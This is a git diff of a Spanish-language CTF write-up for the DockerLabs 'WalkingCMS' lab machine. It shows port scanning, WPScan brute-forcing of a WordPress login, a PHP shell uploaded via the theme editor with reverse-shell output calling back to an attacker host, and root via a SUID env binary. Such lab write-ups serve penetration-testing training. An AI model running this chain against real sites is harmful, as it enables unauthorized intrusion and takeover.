@@ -1,22 +1,30 @@
-# 🖥️ Writeup - WalkingCMS 
+---
+icon: linux
+---
 
-**Plataforma:** Dockerlabs  
-**Sistema Operativo:** Linux  
+# WalkingCMS ​​
+
+## 🖥️ Writeup - WalkingCMS
+
+**Plataforma:** Dockerlabs\
+**Sistema Operativo:** Linux
 
 > **Tags:** `Linux` `WordPress` `PHP` `Gobuster` `WPScan` `Brute Force` `File Upload` `Bypass` `RCE` `SUID`
 
-# INSTALACIÓN
+## INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
-```bash 
+```bash
 unzip walkingcms.zip
 ```
+
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh walkingcms.tar
-``` 
+```
+
 Info:
 
 ```
@@ -41,23 +49,24 @@ Estamos desplegando la máquina vulnerable, espere un momento.
 Máquina desplegada, su dirección IP es --> 172.17.0.2
 
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
-``` 
+```
 
 Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
-# ESCANEO DE PUERTOS
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p80 --min-rate 5000 172.17.0.2
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-17 14:10 CEST
 Nmap scan report for 172.17.0.2
@@ -77,7 +86,7 @@ Tenemos el puerto `80` abierto.
 
 Al acceder vemos solo la página por defecto de `Apache2`.
 
-# GOBUSTER
+## GOBUSTER
 
 Realizamos `fuzzing` de directorios para intentar encontrar rutas o archivos ocultos.
 
@@ -86,6 +95,7 @@ gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/D
 ```
 
 Info:
+
 ```
 ===============================================================
 Gobuster v3.8
@@ -111,13 +121,14 @@ Parece que hay un `CMS`; en este caso, `WordPress`.
 
 Vamos a enumerar la versión, los temas y los usuarios con `WPScan`.
 
-# WPSCAN
+## WPSCAN
 
 ```bash
 wpscan --url http://172.17.0.2/wordpress/ --enumerate u
 ```
 
 Info:
+
 ```
 [i] User(s) Identified:
 
@@ -140,6 +151,7 @@ wpscan --url http://172.17.0.2/wordpress --passwords /usr/share/wordlists/rockyo
 ```
 
 Info:
+
 ```
 [+] Performing password attack on Xmlrpc against 1 user/s
 [SUCCESS] - mario / love                                                                                           
@@ -153,7 +165,7 @@ Encontramos credenciales de `WordPress` para el usuario `mario` : `love`.
 
 Accedemos mediante el login en http://172.17.0.2/wordpress/wp-admin/.
 
-![alt text](../../images/wp.png)
+![alt text](../../.gitbook/assets/wp.png)
 
 Una vez dentro encontramos un `plugin` llamado `Theme Editor`, que nos permite modificar, subir o eliminar archivos de un tema.
 
@@ -180,6 +192,7 @@ http://172.17.0.2/wordpress/wp-content/themes/twentytwentythree/shell.phar
 ```
 
 Info:
+
 ```
 connect to [10.0.4.12] from (UNKNOWN) [172.17.0.2] 60962
 Linux 3196cc390eee 6.12.38+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.12.38-1kali1 (2025-08-12) x86_64 GNU/Linux
@@ -194,36 +207,42 @@ $
 
 Recibimos una `reverse shell` como el usuario `www-data`.
 
-# TTY
+## TTY
 
 Antes de buscar vectores de escalada de privilegios, vamos a hacer un tratamiento de TTY para tener una shell más interactiva, con los siguientes comandos:
 
 ```bash
 script /dev/null -c bash
 ```
+
 `ctrl Z`
+
 ```bash
 stty raw -echo; fg
 ```
+
 ```bash
 reset xterm
 ```
+
 ```bash
 export TERM=xterm
 ```
+
 ```bash
 export BASH=bash
 ```
 
-# ESCALADA DE PRIVILEGIOS
+## ESCALADA DE PRIVILEGIOS
 
 Comprobamos permisos `sudo` y `SUID`.
 
-```bash 
+```bash
 find / -perm -4000 -type f 2>/dev/null
 ```
 
 Info:
+
 ```
 /usr/bin/umount
 /usr/bin/chsh
@@ -243,10 +262,11 @@ Vemos que podemos ejecutar el binario `env` con permisos `SUID`, por lo que pode
 ```
 
 Info:
+
 ```
 bash-5.2# whoami
 root
 bash-5.2#
-``` 
+```
 
 Ya somos root!
